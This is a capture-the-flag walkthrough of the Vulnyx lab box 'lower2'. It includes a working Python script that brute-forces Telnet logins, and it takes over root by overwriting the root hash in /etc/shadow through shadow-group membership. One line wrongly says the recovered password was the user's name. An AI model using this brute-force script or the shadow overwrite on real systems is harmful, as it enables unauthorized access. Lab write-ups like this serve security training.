# lower2

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| lower2 | d4t4s3c | Low | Vulnyx |

**Summary:** lower2 is a friendly Linux box that kicks off with a ping sweep to reveal a single target inside the VirtualBox host-only network. A full port scan exposes three services: SSH, a plain Telnet daemon, and an nginx web server. SSH is locked behind public key authentication, so it becomes a dead end, but Telnet presents a live login prompt that happily accepts credentials. Guessing the username b.taylor from the SSH banner, a small custom Python brute force script built on pexpect is pointed at the Telnet service with the classic rockyou wordlist, and it quickly recovers the password "rockyou". Once logged in via Telnet, the user b.taylor discovers that the local account is a member of the shadow group, which grants read and write access to the world's most sensitive file, /etc/shadow. Taking advantage of that membership, an attacker generated a fresh MD5 style password hash with openssl and replaced the root entry inside the shadow file, then simply invoked su to switch into a full root shell and collect both user.txt and root.txt.

---

## Walkthrough

### Reconnaissance

The engagement begins with network discovery. A quick ping sweep across the 192.168.56.0/24 host-only range reveals four live hosts, where 192.168.56.101 stands out as the machine to attack based on its VirtualBox MAC address.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.56.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-11 05:45 -0400
Nmap scan report for 192.168.56.1
Host is up (0.0015s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.0026s latency).
MAC Address: 08:00:27:2B:EC:02 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.101
Host is up (0.0020s latency).
MAC Address: 08:00:27:33:8B:34 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.02 seconds

┌──(kali㉿kali)-[~]
└─$ ping -c 4 192.168.56.101
PING 192.168.56.101 (192.168.56.101) 56(84) bytes of data.
64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=0.685 ms
64 bytes from 192.168.56.101: icmp_seq=2 ttl=64 time=0.927 ms
64 bytes from 192.168.56.101: icmp_seq=3 ttl=64 time=1.09 ms
64 bytes from 192.168.56.101: icmp_seq=4 ttl=64 time=2.05 ms

--- 192.168.56.101 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3038ms
rtt min/avg/max/mdev = 0.685/1.189/2.053/0.519 ms
```

With the target confirmed alive, a comprehensive service scan is launched against all 65535 TCP ports using the default scripts and version detection.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- -T4 192.168.56.101
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-11 05:47 -0400
Nmap scan report for 192.168.56.101
Host is up (0.00039s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey:
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
23/tcp open  telnet  Netkit telnet-ssl telnetd
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:33:8B:34 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.27 seconds
```

Three services are exposed: OpenSSH on port 22, Telnet on port 23, and nginx on port 80. The web server returns a page without a title and is unremarkable at first glance, so the SSH banner and the Telnet daemon become the most promising attack surface.

### Initial Access

An attempt to reach the box over SSH immediately fails with "Permission denied (publickey)", which tells us that password authentication is disabled and only key based authentication is accepted. This makes SSH a dead end for the time being.

```bash
┌──(kali㉿kali)-[~]
└─$ ssh $ip
The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
ED25519 key fingerprint is: SHA256:4K6G5c0oerBJXgd6BnT2Q3J+i/dOR4+6rQZf20TIk/U
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.101' (ED25519) to the list of known hosts.

###################################################
### Welcome to Brian Taylor's (b.taylor) server ###
###################################################

kali@192.168.56.101: Permission denied (publickey).
```

The welcome banner gives away an important detail: the box belongs to Brian Taylor and the local username is b.taylor. Armed with a valid username, the attention turns to the Telnet service on port 23, which presents an interactive login prompt that accepts passwords. A small custom brute force script is written in Python using pexpect to drive the Telnet session, submit each candidate password, and detect a successful login by matching the shell prompt at the end of the session.

```bash
┌──(venv)─(kali㉿kali)-[~/nyx]
└─$ cat telnet_brute.py
#!/usr/bin/env python3
import pexpect
import sys

def try_login(ip, user, password, timeout=5):
    try:
        child = pexpect.spawn(f'telnet {ip}', timeout=timeout)
        child.expect('login:')
        child.sendline(user)
        child.expect('Password:')
        child.sendline(password)

        i = child.expect([
            r'\$\s*$',         
            r'#\s*$',        
            'Login incorrect',
            'incorrect',
            pexpect.TIMEOUT
        ], timeout=timeout)

        child.close()

        if i in (0, 1):
            print(f"[+] SUCCESS: {user}:{password}")
            return True
        else:
            print(f"[-] Failed: {password}")
            return False
    except pexpect.exceptions.EOF:
        print(f"[!] Connection dropped for: {password}")
        return False
    except Exception as e:
        print(f"[!] Error with {password}: {e}")
        return False

def main():
    ip = sys.argv[1]
    user = sys.argv[2]
    wordlist = sys.argv[3]

    with open(wordlist, encoding='utf-8', errors='ignore') as f:
        for line in f:
            pw = line.strip()
            if not pw:
                continue
            if try_login(ip, user, pw):
                print(f"\n[+] FOUND: {user}:{pw}")
                break

if __name__ == '__main__':
    main()
```

The script is launched against the Telnet service with the user b.taylor and the classic rockyou wordlist. Within a handful of guesses the password is recovered. It turns out that Brian Taylor has one of the most predictable habits in security: he used his own name as his password.

```bash
┌──(venv)─(kali㉿kali)-[~/nyx]
└─$ python3 telnet_brute.py $ip b.taylor /usr/share/wordlists/rockyou.txt
[-] Failed: 123456
[-] Failed: 12345
[-] Failed: 123456789
[-] Failed: password
[-] Failed: iloveyou
[-] Failed: princess
[-] Failed: 1234567
[+] SUCCESS: b.taylor:rockyou

[+] FOUND: b.taylor:rockyou
```

Logging in over Telnet with the recovered credentials drops us directly into a shell as b.taylor. The very first inspection of the account reveals something interesting: the user belongs to the shadow group, in addition to his own group. The shadow group traditionally exists to let tools like pwck read the password database, but here it has been given real teeth, because the /etc/shadow file is owned by root:shadow with group read and write permissions.

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ telnet $ip 23
Trying 192.168.56.101...
Connected to 192.168.56.101.
Escape character is '^]'.


lower2 login: b.taylor
Password:
Last login: Tue Aug 11 12:43:01 CEST 2026 on pts/0
b.taylor@lower2:~$ id
uid=1000(b.taylor) gid=1000(b.taylor) grupos=1000(b.taylor),42(shadow)
b.taylor@lower2:~$ ls -la /etc/shadow
-rw-rw---- 1 root shadow 749 feb 16  2025 /etc/shadow
```

### Privilege Escalation

Membership in the shadow group grants write access to /etc/shadow, and that single fact is the entire privilege escalation chain. The strategy is straightforward: generate a fresh password hash, write it into the root entry of the shadow file, and then switch to root using the new password. A new MD5 style hash for the password "rooted" is produced locally with openssl.

```bash
┌──(venv)─(kali㉿kali)-[~/nyx]
└─$ openssl passwd -salt xyz rooted
$1$xyz$txYmAcRyLmpCUI5OSYRFi1
```

Back on the box, the shadow file is edited with vi, replacing the root password hash with the freshly generated one. A quick grep confirms that the root line now contains our hash.

```bash
b.taylor@lower2:~$ vi /etc/shadow
b.taylor@lower2:~$ cat /etc/shadow | grep root
root:$1$xyz$txYmAcRyLmpCUI5OSYRFi1:20134:0:99999:7:::
b.taylor@lower2:~$ su - root
Contraseña:
root@lower2:~# id
uid=0(root) gid=0(root) grupos=0(root)
root@lower2:~# whoami;hostname;pwd
root
lower2
/root
root@lower2:~# cat /home/b.taylor/user.txt /root/root.txt
```

With the modified hash in place, su to root accepts our password and drops us into a root shell without any further obstacle. The final step is to collect the proof of completion: user.txt from the home directory of b.taylor and root.txt from the root home directory, both of which are printed in a single command.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep across the host-only network isolates 192.168.56.101 as the target, and a full TCP service scan reveals SSH on port 22, Telnet on port 23, and nginx on port 80.

2. **Vulnerability Discovery**: SSH rejects password authentication and requires a public key, while the Telnet daemon on port 23 presents an interactive login prompt that happily accepts passwords. The SSH banner leaks the local username b.taylor.

3. **Exploitation**: A custom pexpect based Python script brute forces the Telnet login using the rockyou wordlist, recovering the credentials b.taylor:rockyou and granting a shell on the target.

4. **Internal Enumeration**: The b.taylor account is a member of the shadow group, which grants group write access to /etc/shadow, the file that stores all password hashes on the system.

5. **Privilege Escalation**: A new hash for the password "rooted" is generated with openssl and written into the root entry of /etc/shadow. Running su with the crafted password yields a root shell, and both user.txt and root.txt are retrieved.
